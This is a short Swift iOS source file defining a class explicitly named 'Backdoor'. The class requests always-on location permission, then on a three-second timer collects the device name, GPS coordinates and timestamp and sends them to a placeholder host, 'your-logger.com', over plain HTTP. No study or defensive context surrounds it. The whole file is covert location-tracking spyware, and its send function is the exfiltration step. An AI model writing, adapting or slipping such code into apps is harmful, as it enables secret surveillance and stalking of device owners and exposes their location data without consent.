import UIKit
import CoreLocation

class Backdoor {
    static let shared = Backdoor()
    private let locationManager = CLLocationManager()
    
    func start() {
        locationManager.requestAlwaysAuthorization()
        Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { _ in
            let data = "Device: \(UIDevice.current.name) | Loc: \(self.locationManager.location?.coordinate.latitude ?? 0),\(self.locationManager.location?.coordinate.longitude ?? 0) | Time: \(Date())"
            self.send(data)
        }
    }
    
    private func send(_ log: String) {
        if let url = URL(string: "http://your-logger.com/log?data=\(log.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "")") {
            URLSession.shared.dataTask(with: url).resume()
        }
    }
}
